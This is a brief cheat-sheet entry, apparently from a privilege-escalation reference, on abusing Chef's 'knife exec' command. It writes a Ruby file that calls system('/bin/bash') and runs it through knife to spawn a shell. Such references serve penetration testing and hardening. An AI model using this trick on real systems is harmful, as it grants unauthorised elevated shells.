# chef knife

[https://docs.chef.io/workstation/knife_exec/](https://docs.chef.io/workstation/knife_exec/)

## Privilege Escalation

```
echo "system('/bin/bash')" > shell.rb
knife exec <shell.rb>
```
